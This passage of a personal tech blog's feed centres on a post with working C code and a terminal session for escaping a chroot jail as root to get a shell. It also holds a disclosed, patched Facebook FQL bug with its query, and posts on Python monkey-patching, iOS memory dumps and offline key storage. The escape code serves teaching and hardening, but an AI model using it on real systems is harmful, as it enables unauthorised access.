    <id>http://filippo.io/escaping-a-chroot-jail-slash-1</id>
    
      <content type="html"><![CDATA[<p>Everybody will tell you that a <a href="https://en.wikipedia.org/wiki/Chroot#Uses">chroot jail</a> (that is, making a process think that a directory is instead the root folder, and not letting it access or modify anything outside of that) is ineffective against a process with root privileges<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup> (UID 0). Let’s see why.</p>

<!-- more -->

<p>The escape basically works like this:</p>

<ul>
  <li>
    <p>We create a temporary folder (I named mine <code>.42</code>, hidden not to draw too much attention) and we <code>chroot</code> to that, this way we make sure our current working directory is outside the fake root, and we can do so because we’re <del>CEO</del>root, Bitch<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>;</p>
  </li>
  <li>
    <p>then we <code>chroot</code> to parent folders all the way up to the root (we don’t need to worry about going too up, <code>/../../.. == /</code>);</p>
  </li>
  <li>
    <p>finally we spawn something, a shell, <code>rm -rf</code>, whatever.</p>
  </li>
</ul>

<p>Q: Why couldn’t we just do <code>chroot("../../../../../../..")</code> and call it a day?<br />
A: Because even if the kernel does not want to keep us from doing what we want (we’re root, after all) it will keep faith to the chroot also with us and if from inside the chroot jail we ask to <code>chroot("..")</code> the kernel will regularly expand <code>/..</code> to <code>/</code>. It has to do so, some programs might rely on that. So we have to move our working directory outside of the root before proceeding.</p>

<div><script src="https://gist.github.com/6976188.js?file=unchroot.txt"></script>
<noscript><pre><code>$ echo 1337 | sudo tee /FLAG
1337
$ mkdir chroot
$ cd chroot/
$ mkdir bin etc lib var home
$ ln -s lib lib64
$ ldd /bin/sh
    linux-vdso.so.1 =&gt;  (0x00007fffa9c83000)
    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9a29106000)
    /lib64/ld-linux-x86-64.so.2 (0x00007f9a294d8000)
$ cp /bin/sh bin
$ cp /lib/x86_64-linux-gnu/libc.so.6 lib
$ cp /lib64/ld-linux-x86-64.so.2 lib
$ tree
.
├── bin
│   └── sh
├── etc
├── home
├── lib
│   ├── ld-linux-x86-64.so.2
│   └── libc.so.6
├── lib64 -&gt; lib
└── var

6 directories, 3 files
$
$ cat &gt; unchroot.c
#include &lt;sys/stat.h&gt;
#include &lt;unistd.h&gt;

int main() {
    mkdir(&quot;.42&quot;, 0755);
    chroot(&quot;.42&quot;);
    chroot(&quot;../../../../../../../../../../../../../../../..&quot;);
    return execl(&quot;/bin/sh&quot;, &quot;-i&quot;, NULL);
}
$ gcc -static -o unchroot unchroot.c
$
$ sudo chroot . /bin/sh
# ls
/bin/sh: 1: ls: not found
# ./unchroot
# ls
bin    dev   home            lib         media  proc  sbin     sys  var
boot   etc   initrd.img      lib64       mnt    root  selinux  tmp  vmlinuz
cdrom  FLAG  initrd.img.old  lost+found  opt    run   srv      usr  vmlinuz.old
# cat FLAG
1337
#</code></pre></noscript></div>

<h2 id="other-pitfalls">Other pitfalls</h2>

<p>If <code>chroot()</code> changes also the working directory to be inside the jail this will make it impossible to pop outside by just chrooting to a sub-directory, but this will not stop us.</p>

<p>We can simply grab the file descriptor of the current directory before the first chroot call and then <a href="http://linux.die.net/man/2/fchdir"><code>fchdir()</code></a> to that. <code>chroot()</code> <a href="http://linux.die.net/man/2/chroot">does not close file descriptors</a>.</p>

<p>Also, if the root privileges were incorrectly dropped, for example by calling <a href="http://linux.die.net/man/2/seteuid"><code>seteuid()</code></a>, a call to <code>setuid(0)</code> might be useful in restoring them.</p>

<h2 id="so-how-does-a-correct-chroot-look-like">So, how does a correct chroot look like?</h2>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
</pre></td><td class="code"><pre><code class="c"><span class="line"><span class="n">assert</span><span class="p">(</span><span class="n">UID</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
</span><span class="line"><span class="n">chdir</span><span class="p">(</span><span class="s">&quot;jail&quot;</span><span class="p">);</span>
</span><span class="line"><span class="n">chroot</span><span class="p">(</span><span class="s">&quot;.&quot;</span><span class="p">);</span>
</span><span class="line"><span class="n">setuid</span><span class="p">(</span><span class="n">UID</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>And make sure that there are no <a href="https://en.wikipedia.org/wiki/Setuid"><code>setuid</code></a> binaries inside the jail<sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup>!</p>

<h2 id="a-catch-all-compile-everywhere-c-unchroot">A catch-all compile-everywhere C <code>unchroot</code></h2>

<div><script src="https://gist.github.com/6976188.js?file=unchroot.c"></script>
<noscript><pre><code>#include &lt;sys/stat.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;

int main() {
    int dir_fd, x;
    setuid(0);
    mkdir(&quot;.42&quot;, 0755);
    dir_fd = open(&quot;.&quot;, O_RDONLY);
    chroot(&quot;.42&quot;);
    fchdir(dir_fd);
    close(dir_fd);  
    for(x = 0; x &lt; 1000; x++) chdir(&quot;..&quot;);
    chroot(&quot;.&quot;);  
    return execl(&quot;/bin/sh&quot;, &quot;-i&quot;, NULL);
}</code></pre></noscript></div>

<div class="footnotes">
  <ol>
    <li id="fn:1">
      <p>Or even just the CAP_SYS_CHROOT privilege (that self-chroot jailing processes often forget to drop), most of the cases we just need to be able to run <code>chroot()</code>.<a href="#fnref:1" rel="reference">&#8617;</a></p>
    </li>
    <li id="fn:2">
      <p><a href="http://galeri4.uludagsozluk.com/105/im-ceo-bitch_182484.jpg">Ahem</a>.<a href="#fnref:2" rel="reference">&#8617;</a></p>
    </li>
    <li id="fn:3">
      <p><code>find / -type f \( -perm -4000 -o -perm -2000 \)</code><a href="#fnref:3" rel="reference">&#8617;</a></p>
    </li>
  </ol>
</div>
]]></content>
    
  </entry>
  
  <entry>
    
      <title type="html"><![CDATA[Instance monkey-patching in Python]]></title>
      <link href="http://filippo.io/instance-monkey-patching-in-python/"/>
    
    <updated>2013-10-07T00:19:00+02:00</updated>
    <id>http://filippo.io/instance-monkey-patching-in-python</id>
    
      <content type="html"><![CDATA[<p><a href="https://en.wikipedia.org/wiki/Monkey_patch">Monkey-patching</a> is the technique of swapping functions or methods with others in order to change a module, library or class behavior.</p>

<p>There are some people with strong opinions about it. I haven’t, but it comes really useful when testing, to simulate side-effecting functions or to silence expected errors and warnings.</p>

<p><strong>Class methods</strong> monkey patching in Python is really easy, as you can freely assign function to class method names:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="k">class</span> <span class="nc">Class</span><span class="p">():</span>
</span><span class="line"><span class="o">...</span>    <span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">):</span>
</span><span class="line"><span class="o">...</span>       <span class="k">return</span> <span class="n">x</span> <span class="o">+</span> <span class="n">y</span>
</span><span class="line"><span class="o">...</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="n">inst</span> <span class="o">=</span> <span class="n">Class</span><span class="p">()</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="k">def</span> <span class="nf">not_exactly_add</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">):</span>
</span><span class="line"><span class="o">...</span>    <span class="k">return</span> <span class="n">x</span> <span class="o">*</span> <span class="n">y</span>
</span><span class="line"><span class="o">...</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="n">Class</span><span class="o">.</span><span class="n">add</span> <span class="o">=</span> <span class="n">not_exactly_add</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="n">inst</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
</span><span class="line"><span class="mi">9</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<!-- more -->

<p>This way <strong>all the instances</strong> of the target class will have the method monkey-patched and there is no problem with arguments, bindings… Everything really straight-forward.</p>

<p>We can also call the old existing method, to handle only some cases or to add some functionality while not repeating code (<a href="https://en.wikipedia.org/wiki/Don't_repeat_yourself">DRY</a>):</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="k">class</span> <span class="nc">Class</span><span class="p">():</span>
</span><span class="line"><span class="o">...</span>    <span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">):</span>
</span><span class="line"><span class="o">...</span>       <span class="k">return</span> <span class="n">x</span> <span class="o">+</span> <span class="n">y</span>
</span><span class="line"><span class="o">...</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="n">old_boring_add</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="n">add</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="k">def</span> <span class="nf">add_is_not_enough</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">):</span>
</span><span class="line"><span class="o">...</span>    <span class="k">return</span> <span class="n">old_boring_add</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
</span><span class="line"><span class="o">...</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="n">inst</span> <span class="o">=</span> <span class="n">Class</span><span class="p">()</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="n">inst</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
</span><span class="line"><span class="mi">6</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="n">Class</span><span class="o">.</span><span class="n">add</span> <span class="o">=</span> <span class="n">add_is_not_enough</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="n">inst</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
</span><span class="line"><span class="mi">7</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<!-- Finally, we might want to monkey-patch repeatedly, maybe dinamically, and so have each monkey-patch to **build on top of the previous one**. Easy done,  -->

<p>But what if we wanted to do the same, patching <strong>just a single instance</strong>?</p>

<p>To recap, the requirements are:</p>

<ul>
  <li>we want just the current instance to be patched;</li>
  <li>we want to build something on top of the existing method, not to replace it entirely;</li>
  <li>we want each monkey-patch not to rollback all the previous ones (so no <a href="http://docs.python.org/2/library/functions.html#super"><code>super()</code></a> or class method call);</li>
  <li>we want to be able to do so also from inside a method.</li>
</ul>

<p>The trick is to save and use the existing method as we did above, and then <strong>bind the new function to the instance</strong> with <a href="http://docs.python.org/2/library/types.html#types.MethodType"><code>types.MethodType</code></a> before assigning it to the method name.</p>

<p>The binding is the magic that causes the instance to be passed as first argument (<code>self</code>) each time the method is called. See <a href="http://stackoverflow.com/questions/114214/class-method-differences-in-python-bound-unbound-and-static">these</a> <a href="http://stackoverflow.com/questions/136097/what-is-the-difference-between-staticmethod-and-classmethod-in-python">two</a> StackOverflow questions to get an idea.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">types</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="k">class</span> <span class="nc">Class</span><span class="p">():</span>
</span><span class="line"><span class="o">...</span>    <span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">):</span>
</span><span class="line"><span class="o">...</span>       <span class="k">return</span> <span class="n">x</span> <span class="o">+</span> <span class="n">y</span>
</span><span class="line"><span class="o">...</span>    <span class="k">def</span> <span class="nf">become_more_powerful</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span><span class="line"><span class="o">...</span>       <span class="n">old_add</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">add</span>
</span><span class="line"><span class="o">...</span>       <span class="k">def</span> <span class="nf">more_powerful_add</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">):</span>
</span><span class="line"><span class="o">...</span>          <span class="k">return</span> <span class="n">old_add</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
</span><span class="line"><span class="o">...</span>       <span class="bp">self</span><span class="o">.</span><span class="n">add</span> <span class="o">=</span> <span class="n">types</span><span class="o">.</span><span class="n">MethodType</span><span class="p">(</span><span class="n">more_powerful_add</span><span class="p">,</span> <span class="bp">self</span><span class="p">)</span>
</span><span class="line"><span class="o">...</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="n">inst</span> <span class="o">=</span> <span class="n">Class</span><span class="p">()</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="n">inst</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
</span><span class="line"><span class="mi">6</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="n">inst</span><span class="o">.</span><span class="n">become_more_powerful</span><span class="p">()</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="n">inst</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
</span><span class="line"><span class="mi">7</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="n">inst</span><span class="o">.</span><span class="n">become_more_powerful</span><span class="p">()</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="n">inst</span><span class="o">.</span><span class="n">become_more_powerful</span><span class="p">()</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="n">inst</span><span class="o">.</span><span class="n">become_more_powerful</span><span class="p">()</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="n">inst</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
</span><span class="line"><span class="mi">10</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>And here we go!</p>

<h2 id="a-practical-example">A practical example</h2>

<p>You can see this technique being used in <a href="https://github.com/rg3/youtube-dl"><em>youtube-dl</em></a> to silence expected warnings in <a href="https://github.com/rg3/youtube-dl/commit/00fcc17aeeab11ce694699bf183d33a3af75aab6">this commit</a>.</p>

<p>The monkey-patching of the instance is done on itself by a method of a testing subclass of the downloader.</p>

]]></content>
    
  </entry>
  
  <entry>
    
      <title type="html"><![CDATA[Dumping the iOS simulator memory]]></title>
      <link href="http://filippo.io/dumping-the-ios-simulator-memory/"/>
    
    <updated>2013-09-12T18:26:00+02:00</updated>
    <id>http://filippo.io/dumping-the-ios-simulator-memory</id>
    
      <content type="html"><![CDATA[<p>To audit memory or to debug with external tools it can be useful to get a <strong>dump of the running memory of an app</strong>.</p>

<p>To do so on a device you’ll need a Jailbreak, SSH access, and <code>gdb</code>. See <a href="https://www.soldierx.com/tutorials/iPhone-Dumping-Game-Memory-and-Injecting-Custom-Code-into-Games">this</a> or <a href="http://rce64.wordpress.com/2013/01/26/decrypting-apps-on-ios-6-single-architecture-no-pieaslr/">this</a>.</p>

<p>If instead you’re up to a simulated app, things are easier: apps running in the simulator are actually just <em>native processes</em> on your Mac OS X.</p>

<p>So, how to get a core dump of a Mac OS X process? Sadly gdb <a href="http://sourceware.org/gdb/onlinedocs/gdb/Core-File-Generation.html">can’t do so</a>. <em>Mac OS X Internals</em> comes to the rescue with <a href="http://osxbook.com/book/bonus/chapter8/core/">this</a> article.</p>

<p>It is actually an interesting read, but if you are in a hurry, skip to downloading <a href="http://osxbook.com/book/bonus/chapter8/core/download/gcore.c">the code</a> and compile it like this (screw the Makefile, it compiles also for PowerPC)</p>

<pre><code>gcc -O2 -arch i386 -Wall -o gcore gcore.c
gcc -O2 -arch x86_64 -Wall -o gcore64 gcore.c
</code></pre>

<p>Then simply run your app, find the process id <code>grep</code>-ping <code>ps -hax</code> and run</p>

<pre><code>sudo gcore 1234
</code></pre>

<p>And enjoy your core dump. (Bonus: you can load it up in <code>gdb</code>)</p>

<p>If you happen to want the dump happen at a particular moment, place a regular breakpoint in XCode, then dump the memory when the process is paused.</p>
]]></content>
    
  </entry>
  
  <entry>
    
      <title type="html"><![CDATA[A bug worth 4200$]]></title>
      <link href="http://filippo.io/a-bug-worth-4200%24/"/>
    
    <updated>2013-04-26T13:04:00+02:00</updated>
    <id>http://filippo.io/a-bug-worth-4200$</id>
    
      <content type="html"><![CDATA[<p><strong>tl;dr</strong> I found a vulnerability in Facebook that allowed anyone to see the “strength” of all his friends’ friendships via a FQL query authenticated with an iOS app access token. The reporting experience has been smooth and not too slow, and the bounty generous.</p>

<p class="img_right"><a href="https://www.facebook.com/BugBounty"><img src="http://filippo.io/images/BugBounty.png" alt="Facebook Bug Bounty" /></a></p>

<p>Early this year Facebook started showing “<em>last active</em>” times above chats in the iOS app but not on the website (they now have rolled out it also in the website) and I started wondering if I could get that info also from my browser and maybe wrap it up in a extension or something (turns out visiting <code>m.facebook.com</code> would have been enough, but emh…). So, I started <a href="http://portswigger.net/burp/proxy.html">Burp Proxy</a> with SSL interception, trusted the Burp CA on my iPad and started inspecting the Facebook iOS app calls.</p>

<!-- more -->

<p>They are mainly <a href="https://developers.facebook.com/docs/technical-guides/fql/"><strong>FQL multiqueries</strong></a>, and one in particular caught my eye (<code>queries</code> parameter URLDecoded for readability):</p>

<pre><code>GET /method/fql.multiquery?sdk=ios&amp;queries={"top_friends":"SELECT uid, online_presence, is_pushable, has_messenger, last_active FROM user WHERE uid in (SELECT uid2 FROM friend WHERE uid1=me() order by communication_rank desc LIMIT 15)","online":"SELECT uid, is_pushable, has_messenger FROM user WHERE online_presence ='active' AND uid IN (SELECT uid2 FROM friend WHERE uid1=me())","favorites":"SELECT uid, online_presence, is_pushable, has_messenger, last_active FROM user WHERE uid in (SELECT favorite_id FROM messaging_favorite WHERE uid=me())","favoriteRanking":"SELECT favorite_id, ordering FROM messaging_favorite WHERE uid=me()"}&amp;sdk_version=2&amp;access_token=REDACTED&amp;format=json&amp;locale=it_IT
</code></pre>

<p>These are a bunch of queries against the <code>user</code> table based on JOINs on the <code>messaging_favorite</code> and <code>friend</code> tables. This <code>friend</code> table is interesting: it holds all the friendships with their details, for example <strong><code>communication_rank</code></strong>. By fiddling around a bit with it I guessed that it is a rank of the <em>“strength”</em> of <code>uid1</code>’s friendship with <code>uid2</code>, probably the thing that decides who’s shown in your chat sidebar even when he’s offline.</p>

<p>The <a href="https://developers.facebook.com/docs/reference/fql/friend">docs</a> tell us that “[the access token owner is] the only user that this table can be queried for, the friends of friends cannot be retrieved”. Hmm. Should we trust the docs? Turns out, <strong>NO</strong>! ;)</p>

<p>Authenticating with our iOS app access token we can issue queries like</p>

<pre><code>SELECT uid2, communication_rank FROM friend WHERE uid1=1289695510 ORDER BY communication_rank DESC
</code></pre>

<p>for an arbitrary friend’s <code>uid1</code> (the above is the one of my favorite guinea pig, Anna) instead of just for ours. That queries return output like</p>

<pre><code>{ "uid2": "1234567890", "communication_rank": "2.4456558227539" },
{ "uid2": "4242424242", "communication_rank": "1.68115234375" },
{ "uid2": "1337133713", "communication_rank": "1.602783203125" },
...
</code></pre>

<p>that tells us with which users the target contacts most, maybe the most interesting and private bit of information after message logs. We don’t even need to be friends of that users!</p>

<h2 id="reporting-and-patching">Reporting and patching</h2>

<p>The first time I reported the issue through <a href="https://www.facebook.com/whitehat/report/">their form</a> it got dismissed, probably also because I didn’t explain it very well. After offering a real world example they confirmed and quickly patched it.</p>

<p>The report netted me a generous 4200$ bounty (delivered as a cool prepaid card, that is worth the withdrawal fee) and a mention on <a href="https://www.facebook.com/whitehat/thanks/">their thanks page</a> (a great, great CV builder), plus some pleasant compliments.</p>

<p class="img_center"><img src="http://filippo.io/images/whitehat.png" alt="White Hat Bounty" /></p>

<p>Facebook offers a great example of how to run a Bug Bounty Program: assure the researcher that he’s being heard, offer him a direct contact (you get ticket-bound <em>Reply-To</em>s) by skilled people, reward him generously (even if, believe me or not, this is the most optional point), publicly thank him and finally let him feel that his work is appreciated.</p>

<h2 id="vulnerability-timeline">Vulnerability timeline</h2>

<table>
  <tbody>
    <tr>
      <td>1 gen 2013</td>
      <td><strong>Vulnerability discovered and bug report filed</strong></td>
    </tr>
    <tr>
      <td>7 gen 2013</td>
      <td>Test accounts POC sent</td>
    </tr>
    <tr>
      <td>18 gen 2013</td>
      <td>First dismissing reply received</td>
    </tr>
    <tr>
      <td>19 gen 2013</td>
      <td><strong>Better explanation and real-users POC sent</strong></td>
    </tr>
    <tr>
      <td>28 gen 2013</td>
      <td>Vulnerability confirmed and acknowledged</td>
    </tr>
    <tr>
      <td>~ 30 gen 2013</td>
      <td><strong>Vulnerability fixed</strong></td>
    </tr>
    <tr>
      <td>1 feb 2013</td>
      <td>Bounty awarded</td>
    </tr>
    <tr>
      <td>18 mar 2013</td>
      <td>Bounty paid</td>
    </tr>
    <tr>
      <td>26 apr 2013</td>
      <td>This public disclosure</td>
    </tr>
  </tbody>
</table>
]]></content>
    
  </entry>
  
  <entry>
    
      <title type="html"><![CDATA[Claimed a RECAP Aaron Swartz grant &#10150;]]></title>
      <link href="https://www.recapthelaw.org/2013/04/02/two-recap-grants-awarded-in-memory-of-aaron-swartz/"/>
    
    <updated>2013-04-04T21:40:00+02:00</updated>
    <id>http://filippo.io/claimed-a-recap-aaron-swartz-grant</id>
    
      <content type="html"><![CDATA[<p>I’ve recently teamed up with a friend of mine, Alessio Palmero, to extend the reach of the <a href="https://www.recapthelaw.org/">RECAP</a> extension to the Appellate Courts documents and win a <a href="http://www.plainsite.org/aaronsw/index.html">grant</a> offered by PlainSite in memory of <a href="http://www.aaronsw.com/">Aaron Swartz</a>.</p>

<p>The Firefox (and now Chrome) extension intercepts public domain documents downloaded from the pay-walled legal archive <a href="http://www.pacer.gov/">PACER</a> and uploads them to the <a href="http://archive.org/">Internet Archive</a>. Freely available documents are then marked as such for the sake of a juster access to public records.</p>

<p>Details and comments in the linked blog post.</p>

<br><a href="http://filippo.io/claimed-a-recap-aaron-swartz-grant/">Permalink</a>]]></content>
    
  </entry>
  
  <entry>
    
      <title type="html"><![CDATA[Offline storage on a RPi]]></title>
      <link href="http://filippo.io/offline-storage-on-a-rpi/"/>
    
    <updated>2013-02-22T23:21:00+01:00</updated>
    <id>http://filippo.io/offline-storage-on-a-rpi</id>
    
      <content type="html"><![CDATA[<p>The only really secure place for data is <strong>an <a href="https://en.wikipedia.org/wiki/Air_gap_(networking)">offline</a> computer</strong>.</p>

<p>A couple of use cases: <a href="http://wiki.debian.org/subkeys">store your primary <strong>GPG key</strong> offline</a>, without expire date, then generate a couple of subkeys with 1y expiration and use them day to day. This way you will need your primary key only to issue/revoke subkeys or to sign other people keys (and no need to waste all your signatures every time your key expire).
Or, <a href="http://bitcoinarmory.com/using-offline-wallets-in-armory/">create a cold wallet for <strong>Bitcoin</strong> with Armory</a> and authorize all transactions from the offline machine while monitoring them from the online one.
And there are much more examples of data best kept offline…</p>

<p>But not everybody has money and space to keep a rarely used computer around only to store a couple of keys.</p>

<p>My solution is to use a <strong>Raspberry Pi</strong> with a <em>dedicated SD card</em>. Budget: <strong>10$</strong> for the SD (every good nerd already has a RPi, right?). Space: negligible.</p>

<p>If you don’t know what a RPi is, <a href="http://www.raspberrypi.org/faqs">it is a credit card sized computer with Ethernet, USB, HDMI that costs 35$</a>. Now you either want to buy one or you stumbled here by accident.</p>

<p>It’s simple: just download <a href="http://www.raspbian.org/">Raspbian</a>, <strong>unplug Ethernet</strong>, install Gnupg and <a href="https://gist.github.com/FiloSottile/3646033">Armory</a> and transfer data with any USB key! <em>Finish!</em> And now you have highest grade security on the cheap.</p>

]]></content>
    
  </entry>
  
</feed>
